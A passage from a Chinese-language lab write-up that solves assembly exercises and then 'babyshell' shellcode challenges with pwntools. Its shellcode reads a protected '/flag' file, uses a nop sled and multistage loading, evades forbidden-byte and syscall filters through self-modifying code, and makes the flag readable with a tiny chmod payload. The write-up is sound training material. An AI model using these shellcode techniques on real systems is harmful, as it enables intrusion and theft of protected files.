class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>19.<strong>条件跳转只能是直接跳转</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    CMP RDI, 4</span><br><span class="hljs-string">    JL AAA</span><br><span class="hljs-string">    MOV RDI, 4</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    mov rax, rdi</span><br><span class="hljs-string">    mov rbx, 8</span><br><span class="hljs-string">    mul rbx</span><br><span class="hljs-string">    mov ebx, DWORD PTR [rax+rsi]</span><br><span class="hljs-string">    jmp rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>20.折腾了半天, 发现题目描述有错的地方, 这里明明是DWORD, 说成quad word.</p><p>还有一点被我忽略了, 如果按照add eax, ebx的做法, <strong>那么超出四字节的部分会被舍弃</strong> </p><p>这里我想到的做法是用eax取出双字数据, 然后用rax做加法.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    mov eax, [rdi+rbx*4]    #在这里</span><br><span class="hljs-string">    add rcx, rax</span><br><span class="hljs-string">    inc rbx</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax, rcx</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>21.硬是没有简化成</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">test rdi, rdi                                                                                                                                                                                 </span><br><span class="hljs-string">jz done</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    inc rdi</span><br><span class="hljs-string">    inc rax</span><br><span class="hljs-string">test:</span><br><span class="hljs-string">    mov cl, [rdi]</span><br><span class="hljs-string">    test rcx, rcx</span><br><span class="hljs-string">    jne loop</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="22-调用"><a href="#22-调用" class="headerlink" title="22.调用"></a>22.调用</h2><p>又是折腾了半天, 主要是逐字节比较的, 从题干也看不出来啊, 孤零零的[src_addr]真就指一个BYTE</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">mov r12, 0x403000</span><br><span class="hljs-string">mov rdx, rdi    ; tmp store rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">test rdx, rdx</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">test:</span><br><span class="hljs-string">mov rsi, [rdx]</span><br><span class="hljs-string">test sil, sil    ;fetched from memory and then comparized bitwise</span><br><span class="hljs-string">jz done</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">cmp sil, 90</span><br><span class="hljs-string">jg if</span><br><span class="hljs-string">mov r13, rax    ;preparation for call foo at 0x403000</span><br><span class="hljs-string">mov dil, [rdx]</span><br><span class="hljs-string">call r12</span><br><span class="hljs-string">mov [rdx], al</span><br><span class="hljs-string">mov rax, r13</span><br><span class="hljs-string">inc rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">if:</span><br><span class="hljs-string">inc rdx</span><br><span class="hljs-string">jmp test</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>23.偷懒, 用了别人的代码, 复习操作系统去了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">;source code:<br>most_common_byte(src_addr, size):<br>    b = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i &lt;= size-<span class="hljs-number">1</span>:<br>        curr_byte = [src_addr + i]<br>        [stack_base - curr_byte] += <span class="hljs-number">1</span><br>    b = <span class="hljs-number">0</span><br><br>    max_freq = <span class="hljs-number">0</span><br>    max_freq_byte = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> b &lt;= <span class="hljs-number">0xff</span>:<br>        <span class="hljs-keyword">if</span> [stack_base - b] &gt; max_freq:<br>            max_freq = [stack_base - b]<br>            max_freq_byte = b<br><br>    <span class="hljs-keyword">return</span> max_freq_byte<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    push rbp</span><br><span class="hljs-string">    mov rbp, rsp</span><br><span class="hljs-string">    sub rsp, 0x100</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">AAA:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, rsi</span><br><span class="hljs-string">    je BBB</span><br><span class="hljs-string">    mov cl, byte ptr [rdi+rbx]</span><br><span class="hljs-string">    add BYTE ptr [rsp+rcx], 1</span><br><span class="hljs-string">    jmp AAA</span><br><span class="hljs-string"></span><br><span class="hljs-string">BBB:</span><br><span class="hljs-string">    mov rbx, -1</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">CCC:</span><br><span class="hljs-string">    add rbx, 1</span><br><span class="hljs-string">    cmp rbx, 0x100</span><br><span class="hljs-string">    je DDD</span><br><span class="hljs-string">    cmp BYTE ptr [rsp+rbx], CL</span><br><span class="hljs-string">    jle CCC</span><br><span class="hljs-string">    mov CL, BYTE ptr [rsp+rbx]</span><br><span class="hljs-string">    mov rdx, rbx</span><br><span class="hljs-string">    JMP CCC</span><br><span class="hljs-string"></span><br><span class="hljs-string">DDD:</span><br><span class="hljs-string">    mov rax, rdx</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    pop rbp</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h1 id="module-4-sc"><a href="#module-4-sc" class="headerlink" title="module 4-sc"></a>module 4-sc</h1><p>基本全在PPT里面.</p><h2 id="0-基本操作"><a href="#0-基本操作" class="headerlink" title="0.基本操作"></a>0.基本操作</h2><ul><li>intro:<ul><li><p>Buiding shellcode: just using pwntools.</p></li><li><p>Debugging: strace or gdb</p></li></ul></li><li>common challenge:<ul><li><p><strong>forbidden bytes:</strong> such as <code>NULL(&#39;\0&#39;)</code>, <code>whitespace</code>,  <code>&#39;H&#39;</code> and so on.</p></li><li><p><strong>self-modifying codes</strong> in level 5.<br><code>gcc -Wl,-N --static -nostdlib -o test test.s</code> to make writable <code>.text</code> segment</p></li><li><p><strong>multistage shellcoding:</strong><br>read into later bytes; or read into <code>read(0, rip, 1000)</code> (using <code>lea rax, [rip]</code> get rip)</p></li><li><p><strong>Shellcode Mangling:</strong><br><u>work backwards</u>  or  <u>jump over some parts to avoid them</u>.</p></li><li><p><strong>Unable to speak:</strong><br>if you can communicate one bit, then you can communicate.<br>such as a exit code? maybe inefficient. or signal? or …</p></li></ul></li><li>Remain injection points: JIT, jus-in-time, 即时.</li></ul><p>avoid null-bytes:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov rdi, 0 -&gt; xor rdi, rdi<br>xor edi, edi //will clear rdi<br>mov rax, 2 -&gt; mov al , 2<br>mov rsi, 100 -&gt; xor rsi, rsi / mov si, 100<br>;set a byte(0x01) in the asm, then dec that address<br>lea rdi, [rip+0x3d] -&gt; mov byte ptr [rip+1], &#x27;/&#x27; ;and then, the whole string: &#x27;/flag&#x27;<br></code></pre></div></td></tr></table></figure><h2 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h2><p>非常直接的一道题目, 不过我重新认识了一下shellcode, 原来amd64.open做的事情还包括防止指令序列中出现<code>&#39;\0&#39;</code>, 以前用的都没有细想这个问题. 不过前两题都是用的read函数直接读取stdin直到eof, 所以不需要担心空字符的问题.<del>amd64.open这个函数我都没有在文档里面查到.</del> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/b*&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-comment">#直接使用wildcard, 不过会匹配到c和binary, 选择第二个即可</span><br>context.binary = binary<br>p = process(binary) <br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>测试程序直接从stdin读取bytes然后存储到数组中, 把数组指针转换成函数指针调用即可执行shellcode.</p><p>附一个asm, 了解一下原理.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movabs rax, 0x101010101010101<br>push rax<br>movabs rax, 0x1010166606d672e # 写入&#x27;flag&#x27;字符串<br>xor qword ptr [rsp], rax<br>mov rdi, rsp<br>xor edx, edx<br>xor esi, esi<br>push 2<br>pop rax<br>syscall    # open<br><br>mov rdi, rax<br>xor eax, eax<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>syscall # read<br><br>push 1<br>pop rdi<br>xor edx, edx<br>mov dh, 1<br>movabs rsi, 0x101010101010101<br>push rsi<br>movabs rsi, 0x1017eff3d8d4981<br>xor qword ptr [rsp], rsi<br>pop rsi<br>push 1<br>pop rax<br>syscall     # write to stdout<br></code></pre></div></td></tr></table></figure><h2 id="2-emmmm"><a href="#2-emmmm" class="headerlink" title="2.emmmm"></a>2.emmmm</h2><blockquote><p>This challenge will <strong>randomly skip up to 0x800 bytes</strong> in your shellcode. You better adapt to that! One way to evade this is to have your shellcode start with a long set of single-byte instructions that do nothing, such as <code>nop</code>, before the actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly execute and then your real shellcode will run. This concept is called a <code>nop sled</code>.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">In [3]: asm(&#x27;nop&#x27;) <br>Out[3]: b&#x27;\x90&#x27;<br></code></pre></div></td></tr></table></figure><p>使用右对齐, <code>fillchar=&#39;\x90’</code>. 即<code>payload = asm(shellcode).rjust(0x800, ‘\90’);</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;stack at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode).rjust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-造一个跳板"><a href="#4-造一个跳板" class="headerlink" title="4.造一个跳板"></a>4.造一个跳板</h2><blockquote><p>使用encode函数: No encoders for amd64 which can avoid b’H’</p><p>mov的一种编码第一个字节就是H, 所以没有办法.</p><p>只能使用先read再jmp的方法.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br><span class="hljs-comment"># 通过测试程序的打印功能查到read编码0xf字节, 所以不用jmp直接接在后面</span><br>shellcode = shellcraft.amd64.read(<span class="hljs-number">0</span>, addr+<span class="hljs-number">0xf</span>, <span class="hljs-number">0x100</span>)<br><br>payload = asm(shellcode)<br>p.sendline(payload)<br>p.recv() <span class="hljs-comment"># 无关紧要</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>payload = asm(shellcode)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="5-禁用syscall系列"><a href="#5-禁用syscall系列" class="headerlink" title="5.禁用syscall系列"></a>5.禁用syscall系列</h2><blockquote><p>啊这, 我这……. 折腾了半天重新看了看课件终于知道他要考我什么了.</p></blockquote><p>还可以用<code>mov byte ptr [rip + s01], 0x0f</code>这样的来改变shellcode本身. 依据在于将0f05两个字节分开来.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov byte ptr [rip+syscall1], 0x0f<br>mov byte ptr [rip+syscall2], 0x05<br></code></pre></div></td></tr></table></figure><p>exploit:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary    <span class="hljs-comment"># 例行解决arch问题</span><br>p = process(binary)<br><br>p.recvuntil(<span class="hljs-string">&quot;memory at 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, addr+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>)<br><br><span class="hljs-comment"># dec BYTE PTR [rip+1]</span><br><span class="hljs-comment"># b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span><br>payload = asm(shellcode)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-comment"># len = len(payload)</span><br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(payload):<br>    <span class="hljs-keyword">if</span> payload[i]==<span class="hljs-number">0x0f</span> <span class="hljs-keyword">and</span> payload[i+<span class="hljs-number">1</span>]==<span class="hljs-number">0x05</span>:<br>        <span class="hljs-comment"># 发现syscall的0x0f05的时候换成一条dec指令+0x0f06, 注意到opcode已经换成了0x0f06</span><br>        <span class="hljs-comment"># 即CLTS(Clear Task-Switched Flag in CR0)指令.</span><br>        <span class="hljs-comment"># 如果整个0f04不存在的指令也行, 不会引起反汇编出现SIGSEGV</span><br>        payload = payload[:i] + <span class="hljs-string">b&#x27;\xfe\r\x01\x00\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x0f\x06&#x27;</span> + payload[i+<span class="hljs-number">2</span>:]<br>        i+=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">else</span>:<br>        i+=<span class="hljs-number">1</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>6.同上, 限制前0x1000写入权限, 总共可写入0x2000</p><blockquote><p>只要read的buf在后4096字节, 然后<code>payload = payload.rjust(0x1500, b&#39;\x90&#39;)</code>即可.</p><p>居然栽在rjust这个函数上: 第一次以为rjust直接修改bytes, 但发现是个不可修改的class, 然后发现width是指修改完后的长度而不是直接在左边填充多少fillchar…</p></blockquote><h2 id="7-关闭stdio"><a href="#7-关闭stdio" class="headerlink" title="7.关闭stdio"></a>7.关闭stdio</h2><blockquote><p>照着课件的说法是每次返回1bit都能communicate…….</p><p>不过直接打开另外一个文件就行了. 居然栽在open syscall的o_flag上, 应该给个O_WRONLY或者O_RDWR.</p><p>shellcraft的open函数能接受int的o_flag或者字符串类型的flag. 只支持大写(这不是当然么, 汇编器只支持这种宏定义).</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#打开文件, rax存储fd, 从文件中读取到内存中addr+0x100, 然后写到stdout</span><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>)<br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/res&quot;</span>, <span class="hljs-number">1</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-string">&#x27;rax&#x27;</span>, addr+<span class="hljs-number">0x200</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br></code></pre></div></td></tr></table></figure><h2 id="8-限制写权限"><a href="#8-限制写权限" class="headerlink" title="8.限制写权限"></a>8.限制写权限</h2><blockquote><p>而且第一次只有0x12(18)字节的汇编字节可以输入. 后面的字节使用了 <code>mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC)</code>来限制再次write.</p></blockquote><p>emmmmmm……….</p><p>tips:</p><blockquote><p>In fact these are a lot of bytes. Try different <strong>sys calls</strong>. There are other ways to read a flag as well</p><p>Search for a syscall that takes minimal argument so as to decrease size</p></blockquote><p><a href="https://man7.org/linux/man-pages/man2/syscalls.2.html">syscalls man7</a> </p><p>找了半天, 只有个chmod能用, 居然刚好18字节, 真绝啊. 一开始想着读取文件肯定是做不到的, 因为只能写到buffer上, 塞不下更多的逻辑了.  18个字节真的太少, 只能换一个方向而去改变他的权限, 然后就可以任意读取了.</p><p>为了尽量节省空间, <code>&#39;/flag&#39;</code>放在了bytes的最后, 由起始地址addr计算出<code>/</code>的位置, 取代s1中9所在位置.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">addr = <span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><br>s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    mov edi, 9</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pos = s1.find(<span class="hljs-string">&#x27;9&#x27;</span>)<br>s1 = s1[:pos] + <span class="hljs-built_in">hex</span>(addr+<span class="hljs-number">12</span>) + s1[pos+<span class="hljs-number">1</span>:]<br>temp = asm(s1)<br>payload = payload + <span class="hljs-string">b&#x27;/flag&#x27;</span><br></code></pre></div></td></tr></table></figure><blockquote><p>不一定要用这种替换, 可以使用<code>lea rdi, [rip+0x??]</code> , 或者下面这个chown系统调用.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">lea rdi, [rip+0xf]<br>mov si, 0x3e8<br>mov dx, si<br>mov al, 